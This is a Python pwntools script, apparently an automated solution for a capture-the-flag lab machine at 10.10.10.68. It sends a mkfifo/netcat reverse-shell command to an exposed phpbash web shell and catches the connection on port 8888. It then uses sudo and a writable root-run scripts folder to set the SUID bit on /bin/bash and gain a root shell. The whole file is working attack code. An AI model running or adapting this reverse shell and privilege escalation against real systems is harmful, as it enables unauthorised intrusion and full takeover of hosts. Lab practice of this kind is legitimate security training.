#!/usr/bin/python3
import threading, requests, netifaces
from pwn import *

def cmd():
	ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
	target = "http://10.10.10.68/dev/phpbash.php"
	data = {"cmd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} 8888 >/tmp/f"}
	requests.post(target, data)

threading.Thread(target=cmd).start()
shell = listen(8888, timeout=20).wait_for_connection()
shell.sendline(b"export SHELL=bash && export TERM=xterm")
shell.sendline(b"sudo -u scriptmanager /bin/sh")
shell.sendline(b"echo 'import os; os.system(\"chmod u+s /bin/bash\")' > /scripts/test.py")
p3 = log.progress("Esclada de privilegios")
p3.status("Iniciando script")
time.sleep(30)
p3.success("Estamos como root")
shell.sendline(b"bash -p")
shell.sendline(b"clear; echo -n '[+] Logged in as: '; whoami")
shell.interactive()
